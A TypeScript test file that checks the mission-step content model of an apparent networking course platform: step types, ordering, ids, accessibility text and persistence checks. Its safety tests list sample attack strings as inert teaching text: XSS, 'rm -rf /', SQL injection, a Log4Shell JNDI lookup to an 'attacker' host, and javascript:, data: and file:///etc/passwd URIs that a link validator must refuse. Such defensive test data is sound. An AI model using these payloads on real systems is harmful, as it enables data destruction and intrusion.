import { describe, expect, it } from "vitest";
import {
  MISSION_STEP_STABLE_ID,
  MISSION_STEP_TEXT_LIMIT,
  MISSION_STEP_TYPES,
  isAllowedReferenceUri,
  isMissionStepType,
  missionStepsInAuthoredOrder,
  resolveMissionStepsForRead,
  resolvePersistedMissionSteps,
  validateMissionStep,
  validateMissionStepContent,
  validateMissionSteps,
  type MissionStep,
  type MissionStepContent,
  type PersistedMissionStepRow
} from "./mission-steps";

/* ------------------------------------------------------------------ *
 * Fixtures — one valid step per approved type
 * ------------------------------------------------------------------ */

const concept: MissionStepContent = {
  type: "concept",
  title: "What a prefix length says",
  paragraphs: [
    "A prefix length says how much of an address identifies the network.",
    "In /24, the first three numbers do."
  ]
};

const diagram: MissionStepContent = {
  type: "diagram",
  assetStableId: "net-foundations.two-host-topology",
  caption: "Two hosts on one switch",
  textAlternative:
    "Two hosts attached to one switch. Each holds an address in a different range, so neither can reach the other without a router."
};

const command: MissionStepContent = {
  type: "command",
  command: "show vlan brief",
  output: "10   WORKSTATIONS   active   Fa0/1",
  language: "cisco-ios"
};

const prediction: MissionStepContent = {
  type: "prediction",
  prompt: "Before you test it: can PC-A reach PC-B right now?",
  options: ["Yes, directly", "No, it needs a router"],
  expectedOutcome: "No. The addresses are in different ranges."
};

const interaction: MissionStepContent = {
  type: "interaction",
  interactionStableId: "packet-journey",
  textEquivalent:
    "Send traffic from PC-A and follow each hop, choosing where it goes next and seeing where it stops."
};

const practice: MissionStepContent = {
  type: "practice",
  assessmentStableId: "ros-kc-read-the-network",
  framing: "A quick check on what this mission covered."
};

const reference: MissionStepContent = {
  type: "reference",
  label: "IPv4 address notation, in one page",
  uri: "https://example.org/ipv4-notation",
  note: "Open this only if the dotted form is still unfamiliar."
};

const oneOfEach: readonly MissionStepContent[] = [
  concept,
  diagram,
  command,
  prediction,
  interaction,
  practice,
  reference
];

const step = (
  stableId: string,
  position: number,
  content: MissionStepContent
): MissionStep => ({ stableId, position, content });

/* ------------------------------------------------------------------ *
 * 1-4. The closed vocabulary and the discriminated union
 * ------------------------------------------------------------------ */

describe("WP-C mission step vocabulary", () => {
  it("accepts all seven approved step types", () => {
    expect([...MISSION_STEP_TYPES]).toEqual([
      "concept",
      "diagram",
      "command",
      "prediction",
      "interaction",
      "practice",
      "reference"
    ]);

    for (const content of oneOfEach) {
      expect(
        validateMissionStepContent(content, content.type),
        `${content.type} should be valid`
      ).toEqual([]);
    }

    // Every approved type is exercised by a fixture, so none can rot unnoticed.
    expect(oneOfEach.map((content) => content.type).sort()).toEqual(
      [...MISSION_STEP_TYPES].sort()
    );
  });

  it("rejects every unapproved step type", () => {
    for (const rejected of [
      "text",
      "lesson",
      "quiz",
      "simulation",
      "video",
      "lab",
      "exercise",
      "explanation",
      "example",
      "output",
      "checkpoint",
      "CONCEPT",
      "",
      null,
      undefined,
      42
    ]) {
      expect(isMissionStepType(rejected)).toBe(false);

      const errors = validateMissionStepContent(
        { type: rejected } as unknown as MissionStepContent,
        "s01"
      );
      expect(errors.length, `${String(rejected)} should be rejected`).toBeGreaterThan(0);
      expect(errors[0]).toContain("unapproved step type");
    }
  });

  it("validates payload against the declared type, not generically", () => {
    // Each of these is a well-formed payload for a DIFFERENT type, so a
    // generic object check would pass them all.
    const mismatched: Array<[string, unknown]> = [
      ["concept without paragraphs", { type: "concept", title: "x" }],
      ["diagram without a text alternative", {
        type: "diagram",
        assetStableId: "a.b"
      }],
      ["command with neither command nor output", { type: "command" }],
      ["prediction without a prompt", { type: "prediction" }],
      ["interaction without a text equivalent", {
        type: "interaction",
        interactionStableId: "packet-journey"
      }],
      ["practice without an assessment", { type: "practice" }],
      ["reference with no target", { type: "reference", label: "x" }],
      ["reference with two targets", {
        type: "reference",
        label: "x",
        uri: "https://example.org/a",
        assetStableId: "a.b"
      }]
    ];

    for (const [label, content] of mismatched) {
      expect(
        validateMissionStepContent(content as MissionStepContent, "s01").length,
        label
      ).toBeGreaterThan(0);
    }
  });
});

/* ------------------------------------------------------------------ *
 * 5. Content safety — inertness, not keyword matching
 * ------------------------------------------------------------------ */

describe("WP-C mission step content safety", () => {
  it("carries no field that can request markup interpretation", () => {
    // The model's safety is structural: there is no html, markup, script,
    // component or render field to set. Enumerating the authored keys proves
    // it more usefully than asserting a validator rejects a string.
    const authoredKeys = oneOfEach.flatMap((content) => Object.keys(content));

    for (const forbidden of [
      "html",
      "rawHtml",
      "markup",
      "script",
      "component",
      "render",
      "template",
      "dangerouslySetInnerHTML"
    ]) {
      expect(authoredKeys).not.toContain(forbidden);
    }
  });

  it("treats code-looking text as valid instructional content", () => {
    // The platform must be able to TEACH HTML, JavaScript, shell and security
    // examples. A validator that rejected these strings would make it unable to
    // teach its own subject matter, so none may pattern-match against them.
    const codeBearing = [
      "<script>alert(1)</script>",
      "<div class=\"x\">hello</div>",
      "rm -rf / --no-preserve-root",
      "'; DROP TABLE missions; --",
      "${jndi:ldap://attacker/a}",
      "SELECT * FROM users WHERE id = 1 OR 1=1"
    ];

    for (const text of codeBearing) {
      expect(
        validateMissionStepContent(
          { type: "concept", paragraphs: [text] },
          "s01"
        ),
        `concept prose should accept: ${text}`
      ).toEqual([]);

      expect(
        validateMissionStepContent(
          { type: "command", command: text },
          "s02"
        ),
        `command content should accept: ${text}`
      ).toEqual([]);
    }
  });

  it("bounds authored text so a single step cannot become a wall", () => {
    const tooLong = "a".repeat(MISSION_STEP_TEXT_LIMIT + 1);

    expect(
      validateMissionStepContent(
        { type: "concept", paragraphs: [tooLong] },
        "s01"
      ).length
    ).toBeGreaterThan(0);
  });
});

/* ------------------------------------------------------------------ *
 * 6-9. Ordering and identity
 * ------------------------------------------------------------------ */

describe("WP-C mission step ordering and identity", () => {
  it("orders by authored position, never by insertion or identity", () => {
    const steps = [
      step("s03-third", 3, concept),
      step("s01-first", 1, command),
      step("s02-second", 2, prediction)
    ];

    expect(missionStepsInAuthoredOrder(steps).map((s) => s.stableId)).toEqual([
      "s01-first",
      "s02-second",
      "s03-third"
    ]);

    // Ordering must not follow array order, and must not follow stable-id
    // sorting either — a course whose ids sort differently from its positions
    // would otherwise render out of sequence.
    const adversarial = [
      step("zzz-taught-first", 0, concept),
      step("aaa-taught-second", 1, concept)
    ];
    expect(
      missionStepsInAuthoredOrder(adversarial).map((s) => s.stableId)
    ).toEqual(["zzz-taught-first", "aaa-taught-second"]);
  });

  it("rejects an invalid position", () => {
    for (const position of [-1, 1.5, Number.NaN, "2" as unknown as number]) {
      const errors = validateMissionStep(step("s01", position as number, concept));
      expect(
        errors.some((message) => message.includes("position")),
        `position ${String(position)} should be rejected`
      ).toBe(true);
    }
  });

  it("rejects duplicate positions within one mission", () => {
    const result = validateMissionSteps([
      step("s01", 0, concept),
      step("s02", 0, command)
    ]);

    expect(result.valid).toBe(false);
    expect(result.errors.join(" ")).toContain("duplicate step position");
  });

  it("rejects duplicate stable ids within one mission", () => {
    const result = validateMissionSteps([
      step("s01", 0, concept),
      step("s01", 1, command)
    ]);

    expect(result.valid).toBe(false);
    expect(result.errors.join(" ")).toContain("duplicate step stable id");
  });

  it("uses the repository stable-id grammar, scoped to the mission", () => {
    // Same grammar as every curriculum node, so an author writes one kind of
    // identifier everywhere.
    for (const valid of ["s01-what-a-network-is", "net.intro", "a1_b2"]) {
      expect(MISSION_STEP_STABLE_ID.test(valid), valid).toBe(true);
    }
    for (const invalid of ["S01", "ab", "-leading", "has space", ""]) {
      expect(MISSION_STEP_STABLE_ID.test(invalid), invalid).toBe(false);
    }

    // Mission-scoped, not global: the SAME id in two different missions is
    // fine, because uniqueness is enforced per mission.
    const missionA = validateMissionSteps([step("s01-intro", 0, concept)]);
    const missionB = validateMissionSteps([step("s01-intro", 0, command)]);
    expect(missionA.valid).toBe(true);
    expect(missionB.valid).toBe(true);
  });
});

/* ------------------------------------------------------------------ *
 * 10-15. Per-type architectural boundaries
 * ------------------------------------------------------------------ */

describe("WP-C mission step architectural boundaries", () => {
  it("references an assessment by stable id and embeds no assessment truth", () => {
    expect(validateMissionStepContent(practice, "s01")).toEqual([]);

    const keys = Object.keys(practice);
    for (const forbidden of [
      "questions",
      "options",
      "correctOptionIds",
      "answerKey",
      "answers",
      "points",
      "passingPercent",
      "score"
    ]) {
      expect(keys).not.toContain(forbidden);
    }
  });

  it("keeps practice non-evidence: a step carries no competency or evidence", () => {
    for (const content of oneOfEach) {
      const keys = Object.keys(content);
      for (const forbidden of [
        "competencyStableId",
        "competencyId",
        "competencies",
        "evidence",
        "evidenceId",
        "awards",
        "demonstrates"
      ]) {
        expect(keys, `${content.type} must not carry ${forbidden}`).not.toContain(
          forbidden
        );
      }
    }
  });

  it("references a future interaction without implementing WP-H", () => {
    expect(validateMissionStepContent(interaction, "s01")).toEqual([]);

    // The seam is the REFERENCE. Parameters, the registry and the
    // ObservationModel belong to WP-H, and an untyped parameters field here
    // would be the arbitrary-JSON escape hatch DEC-054 closes.
    const keys = Object.keys(interaction);
    for (const notYet of [
      "parameters",
      "topology",
      "expectedPath",
      "authoredFault",
      "observationModel",
      "supportLevel"
    ]) {
      expect(keys).not.toContain(notYet);
    }
  });

  it("requires an accessible text alternative on a diagram", () => {
    const errors = validateMissionStepContent(
      {
        type: "diagram",
        assetStableId: "net-foundations.topology",
        textAlternative: "   "
      },
      "s01"
    );

    expect(errors.join(" ")).toContain("text alternative");
  });

  it("requires an accessible text equivalent on an interaction", () => {
    const errors = validateMissionStepContent(
      {
        type: "interaction",
        interactionStableId: "packet-journey",
        textEquivalent: ""
      },
      "s01"
    );

    expect(errors.join(" ")).toContain("text equivalent");
  });

  it("gives a reference step no way to become a prerequisite", () => {
    // BEGINNER-COMPLETE-1: required prerequisite instruction belongs in the
    // instructional path, never behind an optional link. There is no `required`
    // field on any step, so the masquerade is structurally unavailable.
    for (const content of oneOfEach) {
      const keys = Object.keys(content);
      for (const forbidden of [
        "required",
        "prerequisite",
        "prerequisites",
        "requires",
        "mandatory",
        "blocking"
      ]) {
        expect(keys, `${content.type} must not carry ${forbidden}`).not.toContain(
          forbidden
        );
      }
    }

    const keys = Object.keys(step("s01", 0, reference));
    expect(keys).not.toContain("required");
    expect(keys.sort()).toEqual(["content", "position", "stableId"]);
  });

  it("allows only absolute http(s) external references", () => {
    for (const allowed of ["https://example.org/a", "http://example.org/a"]) {
      expect(isAllowedReferenceUri(allowed), allowed).toBe(true);
    }
    for (const rejected of [
      "javascript:alert(1)",
      "data:text/html,<script>1</script>",
      "file:///etc/passwd",
      "/relative/path",
      "example.org",
      ""
    ]) {
      expect(isAllowedReferenceUri(rejected), rejected).toBe(false);
    }
  });

  it("does not model a step as a curriculum or progress node", () => {
    // A curriculum node carries publication state and a version; a progress
    // node carries learner state. A step carries neither, which is what keeps
    // publication inherited and the progress grain at the mission.
    const keys = Object.keys(step("s01", 0, concept));
    for (const nodeField of [
      "publicationState",
      "publication_state",
      "version",
      "nodeType",
      "moduleId",
      "courseId",
      "learningPathId",
      "progress",
      "state",
      "completedAt"
    ]) {
      expect(keys).not.toContain(nodeField);
    }
  });
});

/* ------------------------------------------------------------------ *
 * 16-17. Legacy fallback and fail-safe reads
 * ------------------------------------------------------------------ */

describe("WP-C mission step read outcomes", () => {
  it("treats a legacy mission with zero steps as valid", () => {
    // CURR-010 section 13.4. Existing published missions have no steps and keep
    // rendering from `mission.description` during the transition.
    expect(validateMissionSteps([]).valid).toBe(true);
    expect(resolveMissionStepsForRead([])).toEqual({ state: "legacy_brief" });
    expect(resolvePersistedMissionSteps([])).toEqual({ state: "legacy_brief" });
  });

  it("returns valid steps in authored order", () => {
    const outcome = resolveMissionStepsForRead([
      step("s02", 2, command),
      step("s01", 1, concept)
    ]);

    expect(outcome.state).toBe("available");
    if (outcome.state !== "available") throw new Error("expected available");
    expect(outcome.steps.map((s) => s.stableId)).toEqual(["s01", "s02"]);
  });

  it("fails the whole mission rather than dropping an invalid step", () => {
    // The mission is the integrity boundary. A partial mission looks complete
    // and is not, which would leave a structurally incomplete lesson.
    const outcome = resolveMissionStepsForRead([
      step("s01", 0, concept),
      step("s02", 1, { type: "concept", paragraphs: [] }),
      step("s03", 2, command)
    ]);

    expect(outcome.state).toBe("content_error");
    // No `steps` key exists on the error variant, so a caller cannot render the
    // valid remainder even by accident.
    expect(outcome).not.toHaveProperty("steps");
  });
});

/* ------------------------------------------------------------------ *
 * The persistence integrity boundary
 * ------------------------------------------------------------------ */

describe("WP-C persisted mission step integrity", () => {
  const row = (
    stableId: string,
    position: number,
    stepType: unknown,
    payload: unknown
  ): PersistedMissionStepRow => ({ stableId, position, stepType, payload });

  it("accepts rows whose column type and payload type agree", () => {
    const outcome = resolvePersistedMissionSteps([
      row("s01", 0, "concept", concept),
      row("s02", 1, "command", command)
    ]);

    expect(outcome.state).toBe("available");
    if (outcome.state !== "available") throw new Error("expected available");
    expect(outcome.steps.map((s) => s.content.type)).toEqual([
      "concept",
      "command"
    ]);
  });

  it("fails closed when step_type and payload.type disagree", () => {
    // The discriminator is stored twice: the column the database constrains,
    // and the payload the application reads. A disagreement is a defect, and
    // resolving it silently would change what the learner is taught.
    const outcome = resolvePersistedMissionSteps([
      row("s01", 0, "diagram", concept)
    ]);

    expect(outcome.state).toBe("content_error");
    if (outcome.state !== "content_error") throw new Error("expected error");
    expect(outcome.errors.join(" ")).toContain("disagrees with payload type");
    expect(outcome.errors.join(" ")).toContain("diagram");
    expect(outcome.errors.join(" ")).toContain("concept");
  });

  it("does not normalize either discriminator to match the other", () => {
    const outcome = resolvePersistedMissionSteps([
      row("s01", 0, "diagram", concept)
    ]);

    // Neither "the column wins" nor "the payload wins": the row is refused.
    expect(outcome.state).not.toBe("available");
  });

  it("stays defensive about an unapproved persisted step type", () => {
    // The database CHECK normally prevents this. The read boundary does not
    // rely on a constraint it cannot see: a restored dump, a direct write or a
    // constraint added after some rows must not be trusted.
    for (const rejected of ["lesson", "quiz", "", null, 7]) {
      const outcome = resolvePersistedMissionSteps([
        row("s01", 0, rejected, { type: rejected })
      ]);

      expect(outcome.state, `${String(rejected)} should fail closed`).toBe(
        "content_error"
      );
    }
  });

  it("fails closed when the payload is not an instructional object", () => {
    for (const payload of [null, "concept", 7, ["concept"]]) {
      const outcome = resolvePersistedMissionSteps([
        row("s01", 0, "concept", payload)
      ]);

      expect(outcome.state).toBe("content_error");
      if (outcome.state !== "content_error") throw new Error("expected error");
      expect(outcome.errors.join(" ")).toContain("not an instructional object");
    }
  });

  it("does not return the valid remainder when one row is corrupt", () => {
    const outcome = resolvePersistedMissionSteps([
      row("s01", 0, "concept", concept),
      row("s02", 1, "diagram", concept),
      row("s03", 2, "command", command)
    ]);

    expect(outcome.state).toBe("content_error");
    expect(outcome).not.toHaveProperty("steps");
  });
});
